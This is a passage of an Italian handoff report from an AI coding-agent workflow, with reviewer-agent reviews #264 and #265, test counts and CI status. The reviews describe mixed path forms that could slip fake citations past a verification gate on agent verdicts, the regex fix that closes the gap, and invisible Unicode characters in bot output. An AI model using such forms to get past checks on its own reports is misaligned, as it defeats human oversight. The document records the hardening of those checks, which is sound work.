- **Fix proposta (una riga)**: mettere nel lookbehind l'intera classe di caratteri del token, cioè `(?<![\\\w:./\-])`. L'ho provata sugli stessi casi: tutte le forme miste qui sopra danno nessun match. Le citazioni legittime restano: `` `gas.py:4` ``, `(modules/a.py:7)`, `**b.md:1**`, `gas.py:59-71`, `x.gas.py:3`. Anche `../gas.py:4` e `/abs/gas.py:4` restano catturate e vengono rifiutate da `_resolve_path` come prima. Va aggiunto a `tests/test_unit_handoff_check.py:401` un caso che fallisce con la fix attuale, almeno `D:x/gas.py:5` e `C:\x\a.gas.py:4` (deve dare `[]`).

**Elementi esaminati**
- `scripts/check_verdetto.py:44`: regex delle citazioni. Rischio: citazioni legittime perse o forme nuove accettate. **Blocco**, descritto sopra.
- `tests/test_unit_handoff_check.py:393-408`: due test nuovi, verdi (303 passed su gate e handoff_check). Coprono solo `C:\x\…` e `D:gas.py`, non le forme miste. **Riserva**: è proprio il buco del blocco.
- `.claude/agents/revisore.md:59-61`: la frase sulle citazioni di contesto ora è intera, il significato non cambia. **Ok.**
- `.claude/commands/fine-task.md:243`: regola F-verdetto-ritoccato. Mai ritoccare il verdetto: si chiede al revisore di riemetterlo e lo si dichiara accanto all'originale. È coerente con `reports/stato_progetto.md:161` e rende la procedura più severa. **Ok.**
- `.gitignore:8`: la riga `.gas_history.json.*` copre i file `.tmp.<pid>` e `.corrupt.<ts>` scritti a `gas.py:832` e `gas.py:845`. `.gas_history.json` resta ignorato e viene forzato con force-add come prima. **Ok.**
- `modules/notte/notte.py:17-18` e `modules/notte/notte.py:149-150`: solo a capo. La concatenazione implicita della f-string dà la stessa stringa. **Ok.**
- `modules/telegram/bot.py:128` e `modules/telegram/bot.py:139-142`: R-263-1 chiusa per NBSP, U+3000, i selettori FE00–FE0F ed E0100–E01EF e i riempitivi Hangul (verificato a mano). Nel test `tests/test_unit_gate.py:515` ho controllato che i caratteri letterali FE0F e U+3164 sono davvero nel sorgente. **Riserva R-264-2 (BASSA)**: restano invisibili U+034F (combining grapheme joiner, categoria Mn) e U+2800 (braille vuoto, So). Effetto collaterale accettato: il read-back mostra `❤<U+FE0F>` sulle emoji, è rumore e non un problema di sicurezza.

**Rischio escluso**: non ho rilanciato la suite completa (945) né la sonda del kernel (743/0). Ho eseguito solo `tests/test_unit_gate.py` e `tests/test_unit_handoff_check.py`, perché la fetta non tocca `gas.py`. Non ho nemmeno verificato `check_verdetto.py` su un handoff reale: l'ho provato solo sulla regex isolata e sui test.

Riga contatore #264 e lezione (un lookbehind deve contenere tutta la classe del token) aggiunte a `/home/user/Gas/.claude/agents/memoria_revisore.md` e committate con `scripts/commit_memoria_revisore.sh`. Lo script non ha stampato nulla, quindi non ho una conferma diretta che il commit sia andato a buon fine. Dopo la fix serve una nuova review.

File rilevanti: `/home/user/Gas/scripts/check_verdetto.py`, `/home/user/Gas/tests/test_unit_handoff_check.py`, `/home/user/Gas/modules/telegram/bot.py`.

#### Review #265 ORIGINALE (fetta 3, ri-review, commit `0480996`)

**VERDETTO (originale):** APPROVATO

Ri-review #265, dopo la bocciatura #264. Le due cose che avevo chiesto sono state fatte: il gate B non accetta più le forme miste e i caratteri invisibili mancanti ora vengono mostrati.

**Elementi esaminati**
- `scripts/check_verdetto.py:46`: ora il lookbehind contiene tutti i caratteri che possono comparire in un percorso, cioè `(?<![\\\w:./\-])`. Così il regex non può più ripartire a metà di un percorso. Ho controllato il rischio che si perdano citazioni legittime confrontando vecchio e nuovo regex su testi veri:
  - in `reports/handoff.md` le citazioni trovate sono 14 sia prima sia dopo;
  - in `.claude/agents/memoria_revisore.md` passano da 389 a 386, e le 3 perse sono proprio le forme d'attacco che avevo scritto io nella #264.
  
  Il gate è più severo di prima e non ha perso nulla di legittimo. **Ok.**
- `tests/test_unit_handoff_check.py:401`: il test controlla che le 4 forme miste non vengano catturate (`D:x/gas.py:5`, `C:\x\a.gas.py:4`, `C:\x\y/gas.py:4`, `C:\x\modules/telegram/bot.py:4`). Controlla anche che le forme legittime restino catturate: `gas.py:59-71`, `x.gas.py:3`, `../gas.py:4`, le citazioni dentro backtick o parentesi e quelle in grassetto. **Ok.**
- `modules/telegram/bot.py:128`: U+034F (un carattere di unione invisibile) e U+2800 (braille vuoto) sono aggiunti a `_INVISIBILI_EXTRA`. L'ho verificato a mano: escono come `<U+034F>` e `<U+2800>`. Con questo R-264-2 è chiusa. **Ok.**
- `tests/test_unit_gate.py:521`: il test copre i due caratteri nuovi. **Ok.**
- Le altre modifiche della fetta sono le stesse che avevo già giudicato ok nella #264: `.claude/agents/revisore.md`, `.claude/commands/fine-task.md`, `.gitignore`, `modules/notte/notte.py`.

**Rischio escluso**: non ho rilanciato la suite completa (945 passed secondo l'agente) né la sonda del kernel. Ho eseguito solo `tests/test_unit_gate.py` e `tests/test_unit_handoff_check.py` (303 passed) e il confronto sul corpus reale. Non ho fatto girare `check_verdetto.py` sull'handoff finale della sessione, perché quell'handoff non esiste ancora.

Riga contatore #265 aggiunta a `/home/user/Gas/.claude/agents/memoria_revisore.md` e committata (31517ed). Resta da fare, a carico dell'agente: creare il marcatore con `bash scripts/segna_review_ok.sh` sul diff staged attuale.

## §5 DELTA TEST DEL MOTORE

- pytest: 874 passed (primo giro della sessione, già con i 9 test dotenv della prima versione) → **945 passed** (`945 passed in 112.59s`).
- Suite kernel (`python3 tests/test_unit_kernel.py`): prima della sessione `=== RIEPILOGO: 715 PASS, 0 FAIL ===` → dopo:

```
=== RIEPILOGO: 743 PASS, 0 FAIL ===
```

Nessun FAIL fuori scope.

## §6 STATO CI

`gh run list -L 3`: CI NON VERIFICATA via `gh` (nel container `gh` non è autenticato). Lettura con lo strumento GitHub collegato (check run della PR #180 sul push di `0480996`, prima del commit di fine-task):

- `handoff-check`: **failure** (run 38143041291) — atteso: il push conteneva ancora l'handoff della sessione precedente; questo commit lo sostituisce.
- `unit-suite`: in_progress (run 38143041291) al momento della scrittura.
- `smista`/`verifica`/`esito` (bot, run 38143052969): skipped (manca ancora l'etichetta `verifica`).

Mappatura commit→run:
- `0480996` (testa del primo push): run 38143041291 (unit-suite in corso, handoff-check failure).
- `faf1d1e`, `5764c4e`, `c6a2998`, `477ff0c`, `1ee779b`, `3e031f2`, `755c5a1`, `31517ed`: nessuna run su questo SHA (pushati insieme a `0480996`, una sola run sulla testa).
- Commit di fine-task: run non ancora disponibile alla scrittura dell'handoff.

## §7 RISERVE APERTE

- **R-260-3** (BASSA, doc): sul VPS un `.env` vecchio accanto a gas.py ora riempie le variabili mancanti in `.env.prod`. Tracciata in `reports/stato_progetto.md`.
- **Limiti dichiarati 1A** (riserve 4-5 della #262 + hard link): lettura del codice vietata (livello 2 utile solo su file piccoli/nuovi, script, config), Windows fuori dal modello di minaccia, hard link preesistenti non coperti. In `reports/design_cancello.md` §5b.
- R-260-1, R-260-2, R-263-1, R-264-2: CHIUSE in sessione.
- **Regola F-verdetto-ritoccato da precisare** (BASSA, processo): «riemesso accanto all'originale nel §4» non funziona quando l'originale contiene finte citazioni (il gate resta rosso); in questa sessione l'originale è in §4b. Precisare `.claude/commands/fine-task.md` (passa dal revisore).
